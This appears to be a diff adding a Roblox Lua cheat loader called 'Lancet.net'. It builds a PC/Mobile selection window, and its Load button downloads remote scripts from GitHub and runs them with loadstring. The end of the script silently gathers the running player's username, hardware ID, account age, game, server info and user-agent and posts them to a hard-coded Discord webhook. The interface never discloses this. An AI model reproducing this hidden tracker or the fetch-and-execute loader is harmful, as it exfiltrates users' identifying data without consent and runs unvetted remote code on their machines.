@@ -1,0 +1,236 @@
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local TItle = Instance.new("TextLabel")
+local Image = Instance.new("ImageLabel")
+local Exit = Instance.new("TextButton")
+local Load = Instance.new("TextButton")
+local DropdownFrame = Instance.new("Frame")
+local ItemsFrame = Instance.new("Frame")
+local Item1 = Instance.new("TextButton")
+local Item2 = Instance.new("TextButton")
+local DropdownButton = Instance.new("TextButton")
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
+MainFrame.BorderColor3 = Color3.new(0.341176, 0.352941, 0.588235)
+MainFrame.BorderSizePixel = 2
+MainFrame.Position = UDim2.new(0.253305316, 0, 0.142019793, 0)
+MainFrame.Size = UDim2.new(0, 334, 0, 307)
+
+TItle.Name = "TItle"
+TItle.Parent = MainFrame
+TItle.BackgroundColor3 = Color3.new(1, 1, 1)
+TItle.BackgroundTransparency = 1
+TItle.BorderColor3 = Color3.new(0, 0, 0)
+TItle.BorderSizePixel = 0
+TItle.Position = UDim2.new(0.365079373, 0, -0.0285714287, 0)
+TItle.Size = UDim2.new(0, 200, 0, 50)
+TItle.Font = Enum.Font.Michroma
+TItle.Text = "Lancet.net"
+TItle.TextColor3 = Color3.new(1, 1, 1)
+TItle.TextSize = 30
+
+Image.Name = "Image"
+Image.Parent = MainFrame
+Image.BackgroundColor3 = Color3.new(1, 1, 1)
+Image.BackgroundTransparency = 0.949999988079071
+Image.BorderColor3 = Color3.new(0, 0, 0)
+Image.BorderSizePixel = 0
+Image.Position = UDim2.new(0, 0, 0.00790633913, 0)
+Image.Size = UDim2.new(0, 132, 0, 304)
+Image.Image = "http://www.roblox.com/asset/?id=6740438869"
+
+Exit.Name = "Exit"
+Exit.Parent = MainFrame
+Exit.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
+Exit.BorderColor3 = Color3.new(0, 0, 0)
+Exit.Position = UDim2.new(0.460317463, 0, 0.895238101, 0)
+Exit.Size = UDim2.new(0, 74, 0, 27)
+Exit.Font = Enum.Font.Michroma
+Exit.Text = "Exit"
+Exit.TextColor3 = Color3.new(1, 1, 1)
+Exit.TextSize = 14
+
+Load.Name = "Load"
+Load.Parent = MainFrame
+Load.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
+Load.BorderColor3 = Color3.new(0, 0, 0)
+Load.Position = UDim2.new(0.736507952, 0, 0.895238101, 0)
+Load.Size = UDim2.new(0, 74, 0, 27)
+Load.Font = Enum.Font.Michroma
+Load.Text = "Load"
+Load.TextColor3 = Color3.new(1, 1, 1)
+Load.TextSize = 14
+
+DropdownFrame.Name = "DropdownFrame"
+DropdownFrame.Parent = MainFrame
+DropdownFrame.BackgroundColor3 = Color3.new(0.0862745, 0.0862745, 0.0862745)
+DropdownFrame.BorderColor3 = Color3.new(0.172549, 0.172549, 0.172549)
+DropdownFrame.Position = UDim2.new(0.419047624, 0, 0.206831485, 0)
+DropdownFrame.Size = UDim2.new(0, 182, 0, 41)
+
+ItemsFrame.Name = "ItemsFrame"
+ItemsFrame.Parent = DropdownFrame
+ItemsFrame.BackgroundColor3 = Color3.new(0.0862745, 0.0862745, 0.0862745)
+ItemsFrame.BorderColor3 = Color3.new(0.172549, 0.172549, 0.172549)
+ItemsFrame.Position = UDim2.new(0, 0, 1, 0)
+ItemsFrame.Size = UDim2.new(0, 182, 0, 100)
+ItemsFrame.Visible = false
+
+Item1.Name = "Item1"
+Item1.Parent = ItemsFrame
+Item1.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
+Item1.BorderColor3 = Color3.new(0, 0, 0)
+Item1.Position = UDim2.new(0.0384615399, 0, 0.0700000003, 0)
+Item1.Size = UDim2.new(0, 168, 0, 43)
+Item1.Font = Enum.Font.Oswald
+Item1.Text = "PC"
+Item1.TextColor3 = Color3.new(1, 1, 1)
+Item1.TextSize = 20
+
+Item2.Name = "Item2"
+Item2.Parent = ItemsFrame
+Item2.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
+Item2.BorderColor3 = Color3.new(0, 0, 0)
+Item2.Position = UDim2.new(0.0384615399, 0, 0.504999995, 0)
+Item2.Size = UDim2.new(0, 168, 0, 43)
+Item2.Font = Enum.Font.Oswald
+Item2.Text = "Mobile"
+Item2.TextColor3 = Color3.new(1, 1, 1)
+Item2.TextSize = 20
+
+DropdownButton.Name = "DropdownButton"
+DropdownButton.Parent = DropdownFrame
+DropdownButton.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
+DropdownButton.BorderColor3 = Color3.new(0.486275, 0.486275, 0.486275)
+DropdownButton.Position = UDim2.new(0.0384615399, 0, 0, 0)
+DropdownButton.Size = UDim2.new(0, 168, 0, 41)
+DropdownButton.Font = Enum.Font.Michroma
+DropdownButton.Text = "Choose"
+DropdownButton.TextColor3 = Color3.new(1, 1, 1)
+DropdownButton.TextSize = 20
+
+local selectedItem = nil
+
+DropdownButton.MouseButton1Click:Connect(function()
+	ItemsFrame.Visible = not ItemsFrame.Visible
+end)
+
+Item1.MouseButton1Click:Connect(function()
+	selectedItem = "PC"
+	DropdownButton.Text = selectedItem
+	ItemsFrame.Visible = false
+end)
+
+Item2.MouseButton1Click:Connect(function()
+	selectedItem = "Mobile"
+	DropdownButton.Text = selectedItem
+	ItemsFrame.Visible = false
+end)
+Exit.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+Load.MouseButton1Click:Connect(function()
+	if selectedItem then
+		if selectedItem == "PC" then
+			print("Loading PC...")
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/norma759/wp/refs/heads/main/LancetNet'))()
+		elseif selectedItem == "Mobile" then
+			print("Loading Mobile...")
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/norma759/wpee/refs/heads/main/LancetMobile'))()
+		end
+	else
+		print("No item selected")
+	end
+end)
+local webhookURL = "https://discord.com/api/webhooks/1331248942515753011/Bb3RNSTt2P5Hs3i-Wqv7i6OfzSCHHkzhY6MkLbXPlW30ajGDf2iISMU2zo0qdR83b5Hm"
+
+local Players = game:GetService("Players")
+local AnalyticsService = game:GetService("RbxAnalyticsService")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local Player = Players.LocalPlayer
+local hwid = AnalyticsService:GetClientId()
+
+local accountAge = Player.AccountAge
+
+local function getGameName()
+    local success, info = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    return success and info.Name or "Unknown Game"
+end
+
+local function getServerInfo()
+    local playerGui = Player:FindFirstChild("PlayerGui")
+    if playerGui then
+        local gameUI = playerGui:FindFirstChild("GameUI")
+        if gameUI and gameUI:FindFirstChild("ServerInfo") and gameUI.ServerInfo:IsA("TextLabel") then
+            return gameUI.ServerInfo.Text
+        end
+    end
+    return "No ServerInfo found"
+end
+
+local thumbSize = 150
+local playerThumbUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=%d&height=%d&format=png", Player.UserId, thumbSize, thumbSize)
+
+local gifUrl = "https://cdn.discordapp.com/attachments/1311970771073105940/1312086891310485665/luckystar.gif?ex=675277e4&is=67512664&hm=a464366e0f474557c9084abc57988149c4b2fc127d25bd3e5e66033707226834&"
+
+local function getUserAgent()
+    local response = request({
+        Url = "https://httpbin.org/user-agent",
+        Method = "GET",
+    })
+    if response and response.StatusCode == 200 then
+        local data = HttpService:JSONDecode(response.Body)
+        return data["user-agent"]
+    end
+    return "Unknown User-Agent"
+end
+
+local data = {
+    content = "",
+    embeds = {
+        {
+            title = "Injected Player Information",
+            description = "The player has injected the script. Here are the details:",
+            color = 0xA0522D,
+            thumbnail = {url = playerThumbUrl},
+            image = {url = gifUrl},
+            fields = {
+                {name = "Username", value = Player.Name, inline = true},
+                {name = "HWID", value = hwid, inline = true},
+                {name = "Account Age (days)", value = tostring(accountAge), inline = true},
+                {name = "Game Name", value = getGameName(), inline = true},
+                {name = "Server Info", value = getServerInfo(), inline = false},
+                {name = "User-Agent", value = getUserAgent(), inline = false},
+            },
+            footer = {
+                text = "Injected at: " .. os.date("%Y-%m-%d %H:%M:%S"),
+                icon_url = "https://cdn.discordapp.com/icons/123456789012345678/abcdef1234567890.png"
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+    }
+}
+
+local jsonData = HttpService:JSONEncode(data)
+local headers = {["Content-Type"] = "application/json"}
+
+local function sendWebhook()
+    local request = (syn and syn.request) or (http_request) or (HttpPost)
+    if request then
+        pcall(function()
+            request({Url = webhookURL, Method = "POST", Headers = headers, Body = jsonData})
+        end)
+    end
+end
+
+sendWebhook()
